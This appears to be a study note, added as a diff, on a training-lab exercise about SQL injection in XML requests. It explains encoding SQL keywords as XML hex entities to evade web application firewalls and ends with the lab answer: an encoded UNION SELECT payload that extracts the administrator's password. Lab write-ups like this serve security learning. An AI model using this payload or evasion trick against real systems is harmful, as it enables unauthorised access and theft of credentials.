@@ -1,0 +1,66 @@
+📍 Where else can SQL injection happen?
+You can inject SQL wherever user input reaches the database. For example:
+
+Forms (like login or search fields)
+
+Cookies
+
+Headers (like User-Agent, Referer)
+
+JSON data
+
+XML data
+
+API requests
+
+If the backend reads that input and puts it into an SQL query — it's injectable!
+
+🧪 Example: SQL injection in XML
+Here’s a piece of XML sent to the server:
+
+xml
+Copy
+Edit
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM users</storeId>
+</stockCheck>
+Notice the weird part:
+
+bash
+Copy
+Edit
+&#x53;ELECT
+That is:
+
+&#x53; → Unicode for S
+
+So &#x53;ELECT becomes SELECT
+
+The server decodes it before executing, so the full SQL becomes:
+
+sql
+Copy
+Edit
+SELECT * FROM users
+😈 Why use encoding tricks?
+To bypass firewalls or filters that block obvious attacks like:
+
+SELECT * FROM users WHERE ...
+They won’t recognize &#x53;ELECT as SELECT, but the server will decode it and run it.
+
+ANSWER TO LAB
+
+Just encode the sql query
+for this lab i have used rightClick->Extenstions->Hackvetor->Encode->hex_entities
+
+<stockCheck>
+<productId>
+1
+</productId>
+<storeId>
+<@hex_entities>
+1 union SELECT password from users where username='administrator'
+</@hex_entities>
+</storeId>
+</stockCheck>
